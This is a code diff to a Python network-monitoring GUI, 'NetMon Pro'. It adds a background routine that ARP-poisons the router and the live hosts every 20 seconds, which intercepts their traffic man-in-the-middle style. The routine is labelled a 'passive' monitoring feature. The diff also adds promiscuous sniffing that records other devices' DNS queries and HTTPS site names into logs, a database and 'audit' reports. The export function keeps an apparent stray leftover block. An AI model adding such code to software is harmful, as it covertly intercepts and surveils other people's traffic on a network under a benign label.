+        with ThreadPoolExecutor(max_workers=5) as executor:
+            futures = [executor.submit(self._deep_scan_device, ip, True) for ip in targets]
+            for f in futures: 
+                try: f.result()
+                except: pass
+            
+        self._queue_ui(self._end_task_ui)
+        self.log(f"✅ Global Service Discovery complete: {len(targets)} hosts scanned", "SUCCESS")
 
     def bandwidth_monitor_gui(self):
         threading.Thread(target=self._bandwidth_monitor, daemon=True).start()
@@ -2315,8 +2589,24 @@ Open Ports:   {len(details.get('ports', {}))}
     def _start_traffic_monitor(self):
         if SCAPY_AVAILABLE and sniff is not None:
             threading.Thread(target=self._traffic_sniffer, daemon=True).start()
+            threading.Thread(target=self._inventory_monitor, daemon=True).start()
         else:
             self.log("⚠️ Activity monitor disabled: Scapy not available", "WARN")
+
+    def _inventory_monitor(self):
+        """Periodically check status of inventory devices for Activity Monitor"""
+        ping_cmd = ['ping', '-n', '1', '-w', '1000'] if platform.system() == 'Windows' else ['ping', '-c', '1', '-W', '1']
+        while self.inventory_monitor_running:
+            if self.monitoring_paused:
+                time.sleep(5)
+                continue
+            with self.state_lock:
+                ips = list(self.devices.keys())
+            for ip in ips:
+                try:
+                    subprocess.run([*ping_cmd, ip], capture_output=True, timeout=1.5)
+                except: pass
+            time.sleep(60)
 
     def _traffic_sniffer(self):
         if not SCAPY_AVAILABLE or sniff is None:
@@ -2327,46 +2617,101 @@ Open Ports:   {len(details.get('ports', {}))}
             self._queue_ui(self._log_activity, "⚠️ Permission Denied: Run as sudo to monitor IP activity.")
             return
 
+        # Passive ARP/MITM Engine: Briefly poison the network to redirect traffic for scanning
+        # This allows the tool to see DNS/Web traffic from other IPs
+        def run_arp_poison():
+            if not SCAPY_AVAILABLE or srp is None: return
+            from scapy.all import send, ARP as scapy_ARP
+            self.log("📡 MITM Engine: ACTIVATED (Capturing traffic from other IPs)", "SUCCESS")
+            while not self.monitoring_paused:
+                try:
+                    with self.state_lock:
+                        # Monitor the top 5 most active live IPs to prevent network lag
+                        target_ips = [ip for ip, info in self.devices.items() if "LIVE" in info.get("status", "")]
+                        router = self.router_ip
+                    
+                    if router and target_ips:
+                        for target in target_ips[:5]: 
+                            if target == router: continue
+                            # Redirect traffic: Tell target we are the router, tell router we are the target
+                            p1 = scapy_ARP(op=2, pdst=target, psrc=router)
+                            p2 = scapy_ARP(op=2, pdst=router, psrc=target)
+                            send(p1, verbose=False, count=1)
+                            send(p2, verbose=False, count=1)
+                    
+                    time.sleep(20) # Re-poison every 20 seconds to maintain the "hook"
+                except Exception: time.sleep(10)
+
+        # START the poisoning engine in the background
+        threading.Thread(target=run_arp_poison, daemon=True).start()
+
         def process_pkt(pkt):
             try:
                 if self.monitoring_paused:
                     return
-                if not pkt.haslayer(IP): return
-                ip = pkt[IP].src
                 
-                # DNS Monitoring
+                # Identify IPs involved
+                ip_src = pkt[IP].src if pkt.haslayer(IP) else None
+                ip_dst = pkt[IP].dst if pkt.haslayer(IP) else None
+                
+                # Check ARP for discovery
+                if pkt.haslayer(ARP) and pkt[ARP].op in [1, 2]:
+                    ip_src = pkt[ARP].psrc
+                    # If we see an ARP request, it's a heartbeat of a live device
+                    now = time.time()
+                    if ip_src not in self.last_activity_log or (now - self.last_activity_log[ip_src]) > 60:
+                        self.last_activity_log[ip_src] = now
+                        self._queue_ui(self._log_activity, f"📡 Device Heartbeat: {ip_src} is active.")
+                
+                if not ip_src:
+                    return
+
+                now = time.time()
+                
+                # 1. DNS Monitoring (Requests from ANY IP)
+                # Filter for DNS Queries (port 53)
                 if pkt.haslayer(DNSQR):
                     query = pkt[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')
                     query = self._sanitize_host(query)
+                    
+                    # Log DNS for the source IP
                     with self.state_lock:
-                        if ip not in self.traffic_logs:
-                            self.traffic_logs[ip] = []
+                        if ip_src not in self.traffic_logs:
+                            self.traffic_logs[ip_src] = []
+                    
                     entry = f"{datetime.now().strftime('%H:%M:%S')} - DNS: {query}"
-                    with self.state_lock:
-                        if entry not in self.traffic_logs[ip]:
-                            self.traffic_logs[ip].append(entry)
-                            self._queue_ui(self._log_activity, f"🌐 {ip} -> {query}")
+                    # Avoid duplicate log spam
+                    if entry not in self.traffic_logs.get(ip_src, []):
+                        self.traffic_logs[ip_src].append(entry)
+                        self._queue_ui(self._log_activity, f"🌐 {ip_src} (DNS) -> {query}")
+                        threading.Thread(target=self._save_traffic_to_db, args=(ip_src, "DNS", query), daemon=True).start()
                 
-                # HTTP Monitoring (Port 80)
-                elif pkt.haslayer(TCP) and pkt.haslayer(Raw):
-                    payload = pkt[Raw].load.decode('utf-8', errors='ignore')
-                    if "Host:" in payload:
-                        host = re.search(r'Host: (.*?)\r\n', payload)
-                        if host:
-                            hostname = self._sanitize_host(host.group(1))
-                            with self.state_lock:
-                                if ip not in self.traffic_logs:
-                                    self.traffic_logs[ip] = []
-                            entry = f"{datetime.now().strftime('%H:%M:%S')} - HTTP: {hostname}"
-                            with self.state_lock:
-                                if entry not in self.traffic_logs[ip]:
-                                    self.traffic_logs[ip].append(entry)
-                                    self._queue_ui(self._log_activity, f"🌐 {ip} -> http://{hostname}")
-            except: pass
+                # 2. HTTPS/SNI Monitoring
+                elif pkt.haslayer(TCP) and (pkt[TCP].dport == 443 or pkt[TCP].sport == 443):
+                    if pkt.haslayer(Raw):
+                        payload = pkt[Raw].load
+                        if payload.startswith(b"\x16\x03"): # TLS Handshake
+                            match = re.search(rb"([a-z0-9.-]+\.(?:com|org|net|edu|gov|io|info|me|co|uk|de|fr|it|es|nl|ca|au|ru|br|jp|cn|in))", payload, re.I)
+                            if match:
+                                hostname = match.group(1).decode('utf-8', errors='ignore')
+                                with self.state_lock:
+                                    if ip_src not in self.traffic_logs:
+                                        self.traffic_logs[ip_src] = []
+                                
+                                entry = f"{datetime.now().strftime('%H:%M:%S')} - HTTPS: {hostname}"
+                                if entry not in self.traffic_logs.get(ip_src, []):
+                                    self.traffic_logs[ip_src].append(entry)
+                                    self._queue_ui(self._log_activity, f"🔒 {ip_src} (HTTPS) -> {hostname}")
+                                    threading.Thread(target=self._save_traffic_to_db, args=(ip_src, "HTTPS", hostname), daemon=True).start()
+
+            except Exception:
+                pass
 
         try:
-            self.log("📡 Activity Monitor: STARTED (DNS/HTTP)")
-            sniff(prn=process_pkt, store=False, filter="udp port 53 or tcp port 80")
+            self.log("📡 Activity Monitor: STARTED (Promiscuous Mode - Multi-IP Capture)")
+            # Use promisc=True to catch packets not destined for us
+            # Use store=False to keep memory usage low
+            sniff(prn=process_pkt, store=False, filter="ip or arp", promisc=True)
         except Exception as e:
             self.log(f"❌ Sniffing Error: {e}", "ERROR")
             self._queue_ui(self._log_activity, f"❌ Error: {e}")
@@ -2381,37 +2726,79 @@ Open Ports:   {len(details.get('ports', {}))}
         self.activity_text.see(tk.END)
 
     def save_all_data_gui(self):
-        directory = filedialog.askdirectory(title="Select Directory to Save All Reports")
+        """Exports a professional, audit-ready security package for corporate use"""
+        directory = filedialog.askdirectory(title="Select Directory for Enterprise Export")
         if not directory:
             return
-        
-        self.log(f"📦 Exporting all reports to {directory}...")
+
+        self.log(f"📦 Generating Enterprise Security Package in {directory}...")
         try:
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            export_dir = os.path.join(directory, f"netmon_full_report_{timestamp}")
+            export_dir = os.path.join(directory, f"NetMon_Audit_{timestamp}")
             os.makedirs(export_dir, exist_ok=True)
-            
-            # 1. Main Report (Text)
+
+            # 1. Executive Summary (The professional report we just built)
             report = self.generate_report()
-            with open(os.path.join(export_dir, "summary_report.txt"), "w", encoding="utf-8") as f:
+            with open(os.path.join(export_dir, "01_Executive_Summary.txt"), "w", encoding="utf-8") as f:
                 f.write(report)
-            
-            # 2. Devices Inventory (CSV)
-            with open(os.path.join(export_dir, "device_inventory.csv"), "w", encoding="utf-8", newline="") as f:
+
+            # 2. Detailed Asset Inventory (CSV)
+            with open(os.path.join(export_dir, "02_Asset_Inventory.csv"), "w", encoding="utf-8", newline="") as f:
                 writer = csv.writer(f)
-                writer.writerow(['IP', 'MAC', 'Hostname', 'Vendor', 'Status', 'Custom Name', 'Is Critical'])
+                writer.writerow(['IP Address', 'MAC Address', 'Hostname', 'Vendor', 'OS Type', 'Status', 'Is Critical', 'Last Seen'])
                 for ip, info in self.devices.items():
-                    writer.writerow([ip, info.get('mac'), info.get('hostname'), info.get('vendor'), 
-                                     info.get('status'), info.get('custom_name', ''), info.get('is_critical', False)])
-            
-            # 3. Operations Log
-            with open(os.path.join(export_dir, "operations.log"), "w", encoding="utf-8") as f:
-                f.write(self.log_text.get(1.0, tk.END))
-            
-            # 4. Traffic Logs (JSON)
-            with open(os.path.join(export_dir, "traffic_logs.json"), "w", encoding="utf-8") as f:
-                json.dump(self.traffic_logs, f, indent=2)
-            
+                    writer.writerow([
+                        ip, 
+                        info.get('mac', 'N/A'), 
+                        info.get('hostname', 'N/A'), 
+                        info.get('vendor', 'N/A'),
+                        info.get('os_type', 'Unknown'),
+                        info.get('status', 'N/A'), 
+                        "YES" if info.get('is_critical', False) else "NO",
+                        datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    ])
+
+            # 3. Security & Vulnerability Audit
+            with open(os.path.join(export_dir, "03_Vulnerability_Audit.txt"), "w", encoding="utf-8") as f:
+                f.write("🛡️ NETMON PRO - DETAILED VULNERABILITY AUDIT\n")
+                f.write("="*60 + "\n\n")
+                for ip, info in self.devices.items():
+                    ports = self.device_details.get(ip, {}).get('ports', {})
+                    if ports:
+                        findings = self._map_vulnerabilities(ip, ports)
+                        f.write(f"▶ TARGET: {ip} ({info.get('hostname', 'Unknown')})\n")
+                        if findings:
+                            for r in findings: f.write(f"  {r}\n")
+                        else:
+                            f.write("  ✅ No critical service vulnerabilities found.\n")
+                        f.write("-" * 40 + "\n")
+
+            # 4. Network Traffic & Activity Log (Audit Trail)
+            with open(os.path.join(export_dir, "04_Network_Activity_Log.txt"), "w", encoding="utf-8") as f:
+                f.write("🌐 NETMON PRO - FULL NETWORK ACTIVITY AUDIT TRAIL\n")
+                f.write("="*60 + "\n\n")
+                for ip, logs in self.traffic_logs.items():
+                    if logs:
+                        f.write(f"▶ DEVICE: {ip}\n")
+                        for entry in logs:
+                            f.write(f"  {entry}\n")
+                        f.write("\n")
+
+            # 5. Raw Data (JSON) for further analysis
+            with open(os.path.join(export_dir, "raw_data_dump.json"), "w", encoding="utf-8") as f:
+                export_data = {
+                    "inventory": self.devices,
+                    "details": self.device_details,
+                    "traffic": self.traffic_logs
+                }
+                json.dump(export_data, f, indent=4)
+
+            self.log(f"✅ Audit Package Ready: {export_dir}", "SUCCESS")
+            messagebox.showinfo("Export Successful", f"Full enterprise audit package saved to:\n{export_dir}")
+
+        except Exception as e:
+            self.log(f"❌ Export Failed: {e}", "ERROR")
+            messagebox.showerror("Export Error", f"An error occurred during export: {e}")
             # 5. Full Device Details (JSON)
             combined_details = {}
             for ip in self.devices:
@@ -2457,7 +2844,7 @@ Open Ports:   {len(details.get('ports', {}))}
         ]
 
         lines = [
-            "NETMON PRO v2.1",
+            "NETMON PRO v2.2",
             "Enterprise Network Security Audit",
             "",
             f"Report Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
@@ -2660,7 +3047,7 @@ Open Ports:   {len(details.get('ports', {}))}
 
         try:
             doc = docx.Document()
-            doc.add_heading('🛡️ NETMON PRO v2.1 - Network Report', 0)
+            doc.add_heading('🛡️ NETMON PRO v2.2 - Network Report', 0)
             doc.add_paragraph(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
 
             table = doc.add_table(rows=1, cols=5)
@@ -2709,27 +3096,86 @@ Open Ports:   {len(details.get('ports', {}))}
         self._queue_ui(self._end_task_ui)
 
     def generate_report(self):
+        """Generates a professional Enterprise-Standard Security Report"""
         with self.state_lock:
             total_devices = len(self.devices)
             critical_assets = sum(1 for info in self.devices.values() if info.get("is_critical", False))
-        grc_score = self.grc_results.get("score", "N/A")
-        grc_risk = self.grc_results.get("risk_level", "N/A")
-        hygiene_score = self.hygiene_results.get("overall", "N/A")
+            snapshot = list(self.devices.items())
+            details_snapshot = dict(self.device_details)
+            traffic_snapshot = dict(self.traffic_logs)
+
         alert_counts = self.alert_manager.counts_last_24h()
-        report = (
-            "🛡️ NETMON PRO v2.1 REPORT\n"
-            f"Generated: {datetime.now()}\n"
-            f"Devices: {total_devices}\n"
-            f"Critical Assets: {critical_assets}\n"
-            f"GRC Score: {grc_score}\n"
-            f"GRC Risk: {grc_risk}\n"
-            f"Hygiene Score: {hygiene_score}\n"
-            f"Alerts (24h): Critical={alert_counts.get('critical',0)}, High={alert_counts.get('high',0)}, "
-            f"Medium={alert_counts.get('medium',0)}, Low={alert_counts.get('low',0)}"
-        )
+        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+        # 1. HEADER & EXECUTIVE SUMMARY
+        report = "="*80 + "\n"
+        report += "🛡️  NETMON PRO ENTERPRISE SECURITY REPORT\n"
+        report += "="*80 + "\n"
+        report += f"Generated On:      {now_str}\n"
+        report += f"Total Assets:      {total_devices}\n"
+        report += f"Critical Assets:   {critical_assets}\n"
+        report += f"Security Alerts:   Critical: {alert_counts.get('critical',0)} | High: {alert_counts.get('high',0)}\n"
+        report += "-"*80 + "\n\n"
+
+        # 2. DEVICE INVENTORY & OS FINGERPRINTING
+        report += "📋 1. ASSET INVENTORY & SYSTEM DETAILS\n"
+        report += "─"*80 + "\n"
+        report += f"{'IP Address':<16} {'Hostname':<20} {'OS Type':<25} {'Status':<15}\n"
+        report += "─"*80 + "\n"
+        for ip, info in snapshot:
+            os_val = info.get('os_type', 'Unknown')
+            status = info.get('status', 'OFFLINE')
+            hostname = info.get('hostname', 'N/A')[:19]
+            report += f"{ip:<16} {hostname:<20} {os_val:<25} {status:<15}\n"
+        report += "\n"
+
+        # 3. VULNERABILITY & SECURITY FINDINGS (The "Meat" of the report)
+        report += "🚨 2. DETAILED SECURITY & VULNERABILITY ASSESSMENT\n"
+        report += "─"*80 + "\n"
+        found_vulns = False
+        for ip, info in snapshot:
+            # Check for open ports in details
+            device_details = details_snapshot.get(ip, {})
+            ports = device_details.get('ports', {})
+            if ports:
+                findings = self._map_vulnerabilities(ip, ports)
+                if findings:
+                    found_vulns = True
+                    report += f"▶ TARGET: {ip} ({info.get('hostname', 'Unknown')})\n"
+                    for f in findings:
+                        report += f"  {f}\n"
+                    report += "\n"
+
+        if not found_vulns:
+            report += "✅ No critical service vulnerabilities detected in current scan.\n\n"
+
+        # 4. NETWORK ACTIVITY & TRAFFIC ANALYSIS (Website visits)
+        report += "🌐 3. NETWORK ACTIVITY MONITORING (Last 24h)\n"
+        report += "─"*80 + "\n"
+        activity_count = 0
+        for ip, logs in traffic_snapshot.items():
+            if logs:
+                activity_count += 1
+                report += f"▶ ACTIVITY FOR {ip}:\n"
+                for log in logs[-8:]: # Show last 8 events per device
+                    report += f"  • {log}\n"
+                report += "\n"
+
+        if activity_count == 0:
+            report += "⚪ No significant external traffic recorded.\n\n"
+
+        # 5. COMPLIANCE & RISK SUMMARY
+        report += "⚖️  4. COMPLIANCE & HYGIENE SUMMARY\n"
+        report += "─"*80 + "\n"
+        report += f"Hygiene Score:    {self.hygiene_results.get('overall', 'N/A')}\n"
+        report += f"GRC Risk Level:   {self.grc_results.get('risk_level', 'N/A')}\n"
+        report += f"Policy Status:    {'Compliant' if self.grc_results.get('score', 0) > 80 else 'Review Required'}\n"
+        report += "\n" + "="*80 + "\n"
+        report += "END OF REPORT - CONFIDENTIAL DATA\n"
+        report += "="*80 + "\n"
+
         self._set_text_widget(self.results_text, report)
         return report
-
     def save_report_txt_gui(self):
         report = self.generate_report()
         path = filedialog.asksaveasfilename(
